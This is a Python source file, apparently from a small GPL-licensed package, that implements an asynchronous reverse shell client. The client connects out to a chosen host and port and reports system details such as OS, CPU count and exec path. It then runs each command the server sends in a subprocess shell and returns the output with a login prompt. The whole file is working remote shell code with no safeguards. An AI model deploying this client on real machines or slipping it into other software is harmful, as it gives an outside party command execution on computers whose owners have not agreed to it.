#!/usr/bin/env python
# -*- coding: utf-8 -*-

###################
#    This package implement 4 asynchronous tools to execute remote commands
#    Copyright (C) 2020  Maurice Lambert

#    This program is free software: you can redistribute it and/or modify
#    it under the terms of the GNU General Public License as published by
#    the Free Software Foundation, either version 3 of the License, or
#    (at your option) any later version.

#    This program is distributed in the hope that it will be useful,
#    but WITHOUT ANY WARRANTY; without even the implied warranty of
#    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
#    GNU General Public License for more details.

#    You should have received a copy of the GNU General Public License
#    along with this program.  If not, see <https://www.gnu.org/licenses/>.
###################

"""
    This module implement the class named ReverseShellClient.
"""

import asyncore
import os
from os import (
    getcwd,
    chdir,
    getlogin,
    cpu_count,
    get_exec_path,
    getenv,
    device_encoding,
)
from asyncio import create_subprocess_shell, run, gather
from asyncio.subprocess import PIPE
from time import perf_counter

__all__ = ["ReverseShellClient"]


class ReverseShellClient(asyncore.dispatcher):
    """
    This class send informations and output of the command to the server.
    """

    def __init__(self, host, port):
        asyncore.dispatcher.__init__(self)
        self.create_socket()
        self.connect((host, port))
        self.get_first_buffer()

    def get_first_buffer(self):
        """
        This method add some informations in the first time.
        """
        path_exec = "\n\t".join(get_exec_path())
        self.buffer = (
            f"OS utilisé : {os.name}\nNombre de CPU : {cpu_count()}\n"
            f"Chemin d'exécution : \n\t{path_exec}"
        )

    def get_buffer_end(self):
        """
        This method add the last line of the output to the client.
        """
        if os.name == "nt":
            self.buffer += f"\n{getlogin()}@{getenv('COMPUTERNAME')}-{getcwd()}>"
        else:
            self.buffer += f"\n{getlogin()}@{getenv('COMPUTERNAME')}:{getcwd()}$"

    def handle_close(self):
        self.close()

    def handle_read(self):
        """
        This method receive the command and call the execution of the command.
        """
        commandes = self.recv(65535).decode()
        results = run(launch_exec(commandes))
        self.buffer = "\n".join(results)

        if "exit" in results:
            self.close()

    def writable(self):
        return len(self.buffer) > 0

    def handle_write(self):
        """
        This method send the command to the client.
        """
        self.get_buffer_end()
        sent = self.send(self.buffer.encode())
        self.buffer = self.buffer[sent:]


async def special_command(commande):
    """
    This method execute one command with "special" execution.
    The command "cd" and "exit" are implemented here.
    """
    if commande.startswith("cd") or commande.startswith("chdir"):
        try:
            chdir(" ".join(commande.split()[1:]))
        except FileNotFoundError:
            return "Error with command : <cd>"
    elif commande.lower().startswith("exit"):
        return "exit"


async def exec_(commande):
    """
    This method execute one command and return the output.
    """
    result = await special_command(commande)
    if result:
        return result

    debut = perf_counter()
    process = await create_subprocess_shell(commande, stdout=PIPE, stderr=PIPE)
    stdout, stderr = await process.communicate()

    result = f"Temps : {perf_counter() - debut}s\nReturn code : {process.returncode}\n"
    if stdout:
        result += f"[stdout]\n{stdout.decode(device_encoding(0))}\n"
    if stderr:
        result += f"[stderr]\n{stderr.decode(device_encoding(0))}\n"
    return result


async def launch_exec(commandes):
    """
    This method parse the command and call the execution method.
    She return a list of output.
    """
    return await gather(*(exec_(commande) for commande in commandes.split(" & ")))


def main():
    from sys import argv

    port = 45678
    host = "127.0.0.1"
    argv_number = 0

    for arg in argv:
        if arg.startswith("--interface=") or arg.startswith("-i="):
            host = arg.split("=")[1]
            argv_number += 1
        elif arg.startswith("--port=") or arg.startswith("-p="):
            try:
                port = int(arg.split("=")[1])
            except ValueError:
                print("ERROR : port must be an integer.")
            else:
                argv_number += 1

    if len(argv) - argv_number > 1:
        print(
            "USAGE : ReverseShellClient --interface=<interface name or adress"
            ", default : ''> --port=<port number, default : 45678>"
        )

    ReverseShellClient(host, port)
    asyncore.loop()


if __name__ == "__main__":
    main()
